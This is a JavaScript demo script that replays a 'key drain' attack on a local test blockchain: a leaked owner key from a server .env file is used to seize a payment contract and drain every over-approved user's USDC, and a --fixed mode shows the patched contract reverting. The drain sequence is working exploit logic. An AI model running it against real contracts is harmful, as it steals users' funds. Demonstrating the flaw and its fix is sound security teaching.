// Attack #3: the 402bridge pattern. An owner key on a web server + users who
// approved a contract for far more than they needed.
//   node demos/03-key-drain.mjs           owner key leaks, every approval is drained
//   node demos/03-key-drain.mjs --fixed   no owner path to user funds, exact approvals
import { startChain, stopChain, setup, roles, abis, pub, walletFor, usdcBalance, fmtUsdc, keyOf, parseUnits } from "../lib/chain.mjs";
import { privateKeyToAccount } from "viem/accounts";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const t = session(fixed ? "x402-key-drain-fixed" : "x402-key-drain", "Key drain");
await startChain();
const { usdc, bridge, bridgeFixed } = await setup({ bridge: true });
const target = fixed ? bridgeFixed : bridge;
// Users approve the payment contract. Vulnerable: far more than needed. Fixed: exactly one payment.
for (const v of roles.victims) {
  const h = await walletFor(v).writeContract({ address: usdc, abi: abis.usdc, functionName: "approve", args: [target, fixed ? parseUnits("5", 6) : parseUnits("1000", 6)] });
  await pub.waitForTransactionReceipt({ hash: h });
}
t.cmd("cat server/.env");
t.warn(`PAYMENTS_OWNER_KEY=${keyOf(roles.facilitator).slice(0, 18)}…   # leaked`);
const owner = privateKeyToAccount(keyOf(roles.facilitator));
t.cmd("node drain.mjs");
const total = async () => (await Promise.all(roles.victims.map((v) => usdcBalance(usdc, v.address)))).reduce((a, b) => a + b, 0n);
t.say(`5 users, balance: $${fmtUsdc(await total())} USDC`);
if (!fixed) {
  let h = await walletFor(owner).writeContract({ address: bridge, abi: abis.bridge, functionName: "transferOwnership", args: [roles.attacker.address] });
  await pub.waitForTransactionReceipt({ hash: h });
  t.bad(`owner changed  →  ${roles.attacker.address.slice(0, 10)}…`);
  for (const v of roles.victims) {
    const bal = await usdcBalance(usdc, v.address);
    h = await walletFor(roles.attacker).writeContract({ address: bridge, abi: abis.bridge, functionName: "transferUserToken", args: [usdc, v.address, roles.attacker.address, bal] });
    await pub.waitForTransactionReceipt({ hash: h });
    t.bad(`  drained ${v.address.slice(0, 10)}…   -$${fmtUsdc(bal)}`);
  }
} else {
  t.note("PayBridgeFixed: no owner, no function that moves another user's funds");
  try {
    await pub.simulateContract({ account: owner, address: bridgeFixed, abi: abis.bridge, functionName: "transferUserToken", args: [usdc, roles.victims[0].address, owner.address, 1n] });
    t.bad("call succeeded");
  } catch { t.ok("transferUserToken(...)  →  reverted: no such function"); }
  try {
    await pub.simulateContract({ account: owner, address: usdc, abi: abis.usdc, functionName: "transferFrom", args: [roles.victims[0].address, owner.address, 1n] });
    t.bad("transferFrom succeeded");
  } catch { t.ok("transferFrom(user → attacker)  →  reverted: no allowance"); }
}
t.say("");
t.big(`USERS' BALANCE: $${fmtUsdc(await total())}    attacker: $${fmtUsdc(await usdcBalance(usdc, roles.attacker.address))}`);
t.save(); stopChain(); process.exit(0);
